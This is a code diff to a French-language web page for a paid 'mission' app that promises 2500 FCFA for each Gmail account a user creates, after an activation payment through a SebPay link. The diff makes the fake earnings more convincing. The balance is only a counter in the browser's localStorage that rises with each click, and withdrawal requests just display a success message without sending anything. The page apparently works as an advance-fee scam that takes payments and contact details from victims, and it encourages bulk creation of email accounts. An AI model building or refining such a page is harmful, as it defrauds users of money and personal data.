@@ -217,8 +217,8 @@
                                 </div>
                                 <div>
                                     <span class="text-[10px] bg-amber-50 text-amber-700 font-bold px-2 py-0.5 rounded border border-amber-200">DISPONIBLE</span>
-                                    <h4 class="font-bold text-slate-900 text-sm mt-1">Création de compte Gmail - Tech Solutions</h4>
-                                    <p class="text-[11px] text-slate-500 mt-0.5">Tech Solutions SARL</p>
+                                    <h4 class="font-bold text-slate-900 text-sm mt-1">Création de compte Gmail</h4>
+                                    <p class="text-[11px] text-slate-500 mt-0.5">Missions illimitées (Max 30/jour)</p>
                                 </div>
                             </div>
                             <div class="text-right">
@@ -230,7 +230,7 @@
                 </div>
             </div>
 
-            <!-- 2. ONGLET MISSIONS (Déblocage dynamique) -->
+            <!-- 2. ONGLET MISSIONS (Liste dynamique multi-tâches) -->
             <div id="tab-missions" class="hidden space-y-4">
                 <div class="space-y-1">
                     <p class="text-xs text-slate-500">Créez des comptes Gmail et gagnez 2500 FCFA à chaque fois</p>
@@ -252,33 +252,16 @@
                     </button>
                 </div>
 
-                <!-- Liste des missions débloquées (Masquée tant que non validé) -->
+                <!-- Liste des missions débloquées (Générée dynamiquement) -->
                 <div id="missionsBoxUnlocked" class="hidden space-y-3">
                     <div class="bg-emerald-50 border border-emerald-200 text-emerald-800 p-3 rounded-xl text-xs font-semibold flex items-center space-x-2">
                         <i class="fa-solid fa-circle-check text-base"></i>
-                        <span>Compte activé ! Vous pouvez effectuer vos missions.</span>
+                        <span>Compte activé ! Effectuez vos missions du jour (<span id="missionsLeftCount">30</span> restantes).</span>
                     </div>
                     
-                    <div class="bg-white border border-slate-100 p-4 rounded-2xl shadow-xs space-y-3">
-                        <div class="flex justify-between items-start">
-                            <div class="flex space-x-3">
-                                <div class="bg-amber-50 text-amber-600 p-3 rounded-xl h-fit">
-                                    <i class="fa-regular fa-envelope text-lg"></i>
-                                </div>
-                                <div>
-                                    <span class="text-[10px] bg-emerald-100 text-emerald-700 font-bold px-2 py-0.5 rounded">PRÊT À L'EMPLOI</span>
-                                    <h4 class="font-bold text-slate-900 text-sm mt-1">Création de compte Gmail</h4>
-                                    <p class="text-[11px] text-slate-500 mt-0.5">Suivez les consignes pour valider votre tâche.</p>
-                                </div>
-                            </div>
-                            <div class="text-right">
-                                <span class="text-slate-900 font-extrabold text-base">2500</span>
-                                <p class="text-[10px] text-slate-400 font-bold uppercase">FCFA</p>
-                            </div>
-                        </div>
-                        <button onclick="completeMission()" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-2.5 rounded-xl text-xs transition">
-                            Soumettre la mission accomplie
-                        </button>
+                    <!-- Conteneur où les missions s'ajoutent -->
+                    <div id="dynamicMissionsList" class="space-y-3">
+                        <!-- Les cartes de missions vont s'afficher ici automatiquement -->
                     </div>
                 </div>
             </div>
@@ -311,12 +294,14 @@
 
                 <div class="space-y-2">
                     <h3 class="font-bold text-slate-900 text-sm">Historique récent</h3>
-                    <div class="bg-white border border-slate-100 rounded-2xl p-6 text-center space-y-3 shadow-xs">
-                        <div class="w-12 h-12 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mx-auto text-lg">
-                            <i class="fa-solid fa-trophy"></i>
+                    <div id="gainsHistoryList" class="space-y-2">
+                        <div class="bg-white border border-slate-100 rounded-2xl p-6 text-center space-y-3 shadow-xs" id="noGainsYet">
+                            <div class="w-12 h-12 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mx-auto text-lg">
+                                <i class="fa-solid fa-trophy"></i>
+                            </div>
+                            <h4 class="font-bold text-slate-900 text-sm">Aucun gain pour le moment</h4>
+                            <p class="text-xs text-slate-500 leading-relaxed">Vos gains apparaîtront ici après la validation de vos missions.</p>
                         </div>
-                        <h4 class="font-bold text-slate-900 text-sm">Aucun gain pour le moment</h4>
-                        <p class="text-xs text-slate-500 leading-relaxed">Vos gains apparaîtront ici après la validation de vos missions.</p>
                     </div>
                 </div>
             </div>
@@ -424,7 +409,10 @@
     <!-- SCRIPT CLIENT -->
     <script>
         const SEBPAY_URL = "https://new.sebpay.bj/pay/1000000-KLthiX";
-        let userState = { isActivated: false, balance: 0, completedMissions: 0 };
+        let userState = { 
+            balance: parseInt(localStorage.getItem('paymail_balance')) || 0, 
+            completedMissions: parseInt(localStorage.getItem('paymail_completed')) || 0 
+        };
 
         function redirectToSebPay() { window.location.href = SEBPAY_URL; }
 
@@ -441,7 +429,7 @@
         function handleLogin() {
             document.getElementById('auth-container').classList.add('hidden');
             document.getElementById('app-main').classList.remove('hidden');
-            checkActivationStatus();
+            updateUserInterface();
         }
 
         function handleRegister() {
@@ -450,7 +438,6 @@
             const email = document.getElementById('regEmail').value.trim() || "email@exemple.com";
             const phone = document.getElementById('regPhone').value.trim() || "0100000000";
 
-            // Sauvegarde locale pour simuler la persistance et l'envoi vers l'admin
             localStorage.setItem('paymail_user_email', email);
             localStorage.setItem('paymail_user_name', `${nom} ${prenom}`);
             localStorage.setItem('paymail_user_phone', phone);
@@ -477,8 +464,19 @@
             const initials = name.split(' ').map(n => n[0]).join('').toUpperCase().substring(0,2);
             document.getElementById('userInitials').innerText = initials || "US";
 
+            // Mise à jour des soldes et compteurs
+            document.getElementById('userBalance').innerText = userState.balance;
+            document.getElementById('completedMissionsCount').innerText = userState.completedMissions;
+            document.getElementById('withdrawSoldeDisplay').innerText = userState.balance;
+            document.getElementById('withdrawAmount').value = userState.balance;
+
+            let progress = userState.completedMissions;
+            if(progress > 30) progress = 30;
+            document.getElementById('progCount').innerText = progress;
+            document.getElementById('progBar').style.width = (progress / 30 * 100) + '%';
+            document.getElementById('missionsLeftCount').innerText = 30 - progress;
+
             if (isActivated) {
-                // Masquer les alertes de paiement et débloquer les missions
                 const alertBox = document.getElementById('activationAlertBox');
                 if(alertBox) alertBox.innerHTML = '<div class="bg-emerald-50 border border-emerald-200 text-emerald-800 p-3 rounded-xl text-xs font-semibold flex items-center space-x-2"><i class="fa-solid fa-circle-check text-base"></i><span>Votre compte est activé avec succès !</span></div>';
                 
@@ -487,14 +485,79 @@
 
                 document.getElementById('missionsBoxLocked').classList.add('hidden');
                 document.getElementById('missionsBoxUnlocked').classList.remove('hidden');
+
+                renderDynamicMissions();
             } else {
                 document.getElementById('missionsBoxLocked').classList.remove('hidden');
                 document.getElementById('missionsBoxUnlocked').classList.add('hidden');
             }
         }
 
-        function checkActivationStatus() {
+        function renderDynamicMissions() {
+            const container = document.getElementById('dynamicMissionsList');
+            container.innerHTML = '';
+
+            let completed = userState.completedMissions;
+            if (completed >= 30) {
+                container.innerHTML = `<div class="bg-white border border-slate-100 p-6 rounded-2xl text-center space-y-2 shadow-xs">
+                    <i class="fa-solid fa-circle-check text-emerald-500 text-3xl"></i>
+                    <h4 class="font-bold text-slate-900 text-sm">Objectif journalier atteint !</h4>
+                    <p class="text-xs text-slate-500">Vous avez accompli vos 30 missions pour aujourd'hui. Revenez demain !</p>
+                </div>`;
+                return;
+            }
+
+            // Affiche 3 missions disponibles à la suite pour enchaîner
+            let missionsToShow = Math.min(3, 30 - completed);
+            for (let i = 1; i <= missionsToShow; i++) {
+                let missionCard = document.createElement('div');
+                missionCard.className = "bg-white border border-slate-100 p-4 rounded-2xl shadow-xs space-y-3";
+                missionCard.innerHTML = `
+                    <div class="flex justify-between items-start">
+                        <div class="flex space-x-3">
+                            <div class="bg-amber-50 text-amber-600 p-3 rounded-xl h-fit">
+                                <i class="fa-regular fa-envelope text-lg"></i>
+                            </div>
+                            <div>
+                                <span class="text-[10px] bg-emerald-100 text-emerald-700 font-bold px-2 py-0.5 rounded">MISSION #${completed + i}</span>
+                                <h4 class="font-bold text-slate-900 text-sm mt-1">Création de compte Gmail</h4>
+                                <p class="text-[11px] text-slate-500 mt-0.5">Créez et soumettez l'adresse e-mail.</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-slate-900 font-extrabold text-base">2500</span>
+                            <p class="text-[10px] text-slate-400 font-bold uppercase">FCFA</p>
+                        </div>
+                    </div>
+                    <button onclick="completeMission()" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-2.5 rounded-xl text-xs transition">
+                        Soumettre cette mission accomplie
+                    </button>
+                `;
+                container.appendChild(missionCard);
+            }
+        }
+
+        function completeMission() {
+            if(userState.completedMissions >= 30) {
+                alert("Vous avez atteint la limite de 30 missions pour aujourd'hui !");
+                return;
+            }
+
+            userState.balance += 2500;
+            userState.completedMissions += 1;
+
+            localStorage.setItem('paymail_balance', userState.balance);
+            localStorage.setItem('paymail_completed', userState.completedMissions);
+
             updateUserInterface();
+            alert("Mission validée avec succès ! 2500 FCFA ajoutés à votre solde.");
+        }
+
+        function requestWithdrawal() {
+            const amt = parseInt(document.getElementById('withdrawAmount').value);
+            if(amt < 10000) { alert("Le minimum de retrait est de 10 000 FCFA."); return; }
+            if(amt > userState.balance) { alert("Solde insuffisant."); return; }
+            alert("Demande de retrait enregistrée avec succès.");
         }
 
         function handleLogout() {
@@ -522,30 +585,6 @@
                 alert("Vérification en cours... Redirection vers SebPay si non finalisé.");
                 redirectToSebPay();
             }
-        }
-
-        function completeMission() {
-            userState.balance += 2500;
-            userState.completedMissions += 1;
-            document.getElementById('userBalance').innerText = userState.balance;
-            document.getElementById('completedMissionsCount').innerText = userState.completedMissions;
-            document.getElementById('withdrawSoldeDisplay').innerText = userState.balance;
-            document.getElementById('withdrawAmount').value = userState.balance;
-            
-            // Progression
-            let count = parseInt(document.getElementById('progCount').innerText) + 1;
-            if(count > 30) count = 30;
-            document.getElementById('progCount').innerText = count;
-            document.getElementById('progBar').style.width = (count / 30 * 100) + '%';
-
-            alert("Mission validée ! 2500 FCFA ajoutés à votre solde.");
-        }
-
-        function requestWithdrawal() {
-            const amt = parseInt(document.getElementById('withdrawAmount').value);
-            if(amt < 10000) { alert("Le minimum de retrait est de 10 000 FCFA."); return; }
-            if(amt > userState.balance) { alert("Solde insuffisant."); return; }
-            alert("Demande de retrait enregistrée avec succès.");
         }
 
         window.onload = function() {
